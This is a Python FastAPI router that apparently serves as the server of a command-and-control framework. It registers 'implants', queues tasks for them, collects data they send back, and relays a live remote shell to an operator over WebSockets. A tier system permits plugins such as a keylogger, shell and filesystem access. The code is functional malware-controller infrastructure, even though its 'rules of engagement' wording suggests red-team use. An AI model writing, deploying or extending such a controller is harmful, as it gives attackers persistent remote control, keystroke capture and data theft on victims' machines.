from fastapi import APIRouter, Depends, HTTPException, Body, WebSocket, WebSocketDisconnect
from typing import Dict, Any

from . import models
from . import security
from .comms import manager

router = APIRouter()

# ==============================================================================
# In-Memory "Database"
# ==============================================================================
IMPLANTS_DB: Dict[str, models.Implant] = {}


# ==============================================================================
# ROE (Rules of Engagement) Logic
# ==============================================================================
ROE_GATES = {
    # Tier: [list_of_allowed_plugins]
    1: ["keylogger", "shell", "filesystem", "dummy", "system_profiler"],
    2: ["keylogger", "filesystem", "dummy", "system_profiler"],
    3: [],
}

def check_roe(implant_id: str, command: str, args: Dict[str, Any]) -> bool:
    """Checks if a command is allowed for an implant's ROE tier."""
    if command != "start_plugin":
        return True

    plugin_name = args.get("plugin_name")
    if not plugin_name:
        return False

    tier = IMPLANTS_DB[implant_id].roe_tier
    if plugin_name in ROE_GATES.get(tier, []):
        return True

    return False

# ==============================================================================
# API Endpoints for Implant Communication
# ==============================================================================

@router.post("/register", response_model=models.RegistrationResponse)
def register_implant(registration: models.ImplantRegistration):
    implant = models.Implant(**registration.model_dump())
    IMPLANTS_DB[implant.id] = implant

    token = security.create_access_token(data={"sub": implant.id})
    return {"implant_id": implant.id, "token": token}

@router.get("/tasks", response_model=models.TaskResponse)
def get_tasks(current_implant_id: str = Depends(security.get_current_implant_id)):
    implant = IMPLANTS_DB.get(current_implant_id)
    if not implant:
        raise HTTPException(status_code=404, detail="Implant not found")

    tasks = implant.tasks
    implant.tasks = []
    return {"tasks": tasks}

@router.post("/data")
def submit_data(payload: models.DataPayload, current_implant_id: str = Depends(security.get_current_implant_id)):
    # In a real system, this data would be written to a secure, structured log or database.
    print(f"[DATA] Received from {current_implant_id} ({payload.plugin}): {payload.data[:200]}")
    return {"status": "received"}

# ==============================================================================
# API Endpoints for Operator CLI
# ==============================================================================

@router.get("/admin/implants", response_model=Dict[str, models.Implant])
def list_implants():
    return IMPLANTS_DB

@router.post("/admin/tasks/{implant_id}", response_model=Dict)
def add_task(implant_id: str, task: models.Task = Body(...)):
    if implant_id not in IMPLANTS_DB:
        raise HTTPException(status_code=404, detail="Implant not found")

    if not check_roe(implant_id, task.command, task.args):
        tier = IMPLANTS_DB[implant_id].roe_tier
        plugin = task.args.get('plugin_name', 'unknown')
        raise HTTPException(
            status_code=403,
            detail=f"ROE VIOLATION: Plugin '{plugin}' is not authorized for Tier {tier} targets."
        )

    IMPLANTS_DB[implant_id].tasks.append(task)
    return {"status": "task added", "task_id": task.task_id}

@router.put("/admin/tier/{implant_id}/{tier}", response_model=Dict)
def set_implant_tier(implant_id: str, tier: int):
    if implant_id not in IMPLANTS_DB:
        raise HTTPException(status_code=404, detail="Implant not found")
    if tier not in ROE_GATES:
        raise HTTPException(status_code=400, detail=f"Invalid tier. Must be one of {list(ROE_GATES.keys())}.")

    IMPLANTS_DB[implant_id].roe_tier = tier
    return {"status": "tier updated", "implant_id": implant_id, "new_tier": tier}


# ==============================================================================
# WebSocket Endpoints for Live Shell
# ==============================================================================

@router.websocket("/ws/implant/{implant_id}")
async def websocket_implant_endpoint(websocket: WebSocket, implant_id: str):
    if implant_id not in IMPLANTS_DB:
        await websocket.close(code=1008)
        return

    await manager.connect_implant(websocket, implant_id)
    try:
        while True:
            data = await websocket.receive_text()
            await manager.send_to_operator(data, implant_id)
    except WebSocketDisconnect:
        manager.disconnect_implant(implant_id)

@router.websocket("/ws/cli/{implant_id}")
async def websocket_cli_endpoint(websocket: WebSocket, implant_id: str):
    await manager.connect_operator(websocket, implant_id)
    try:
        while True:
            data = await websocket.receive_text()
            await manager.send_to_implant(data, implant_id)
    except WebSocketDisconnect:
        manager.disconnect_operator(implant_id)
